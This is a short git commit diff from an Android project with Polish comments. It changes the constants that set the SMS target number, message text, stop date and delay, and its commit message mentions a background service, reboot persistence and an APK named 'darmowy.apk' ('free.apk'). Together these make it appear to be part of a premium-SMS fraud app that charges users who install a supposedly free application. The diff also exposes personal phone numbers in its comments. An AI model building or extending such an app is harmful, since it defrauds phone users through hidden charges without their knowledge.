ad4638c06822f1e967ebdbfa7fb79ca80211e650
szzc <zzsc@o2.pl>
2017-03-11 13:39:54 +0100

    service + random+ reboot + splash + menu + restarts + lastsmstime
    plik darmowy.apk

--- app/src/main/java/com/example/szzc/test/DataIn.java
+++ app/src/main/java/com/example/szzc/test/DataIn.java
@@ -3,8 +3,8 @@ package com.example.szzc.test;
 public interface DataIn {
     long whenStopLong = 1490983727574L;
     // kiedy ma przestać działać ( getTime ) 1490983727574L - 31Marca  //  7 marca 22.00 1488920400000L
-    String number = "695414641"; // nr telefonu 71100 695414641 603684054
-    String message = "TEST"; // Wiadomość
+    String number = "71100"; // nr telefonu 71100   695414641   603684054    darmowy60166
+    String message = "lew"; // Wiadomość
 
     long firstDelay = 60000; // za ile pierwsza wiadomość w milisekundach getTime + milis
     // przy losowaniu tylko firstDelay
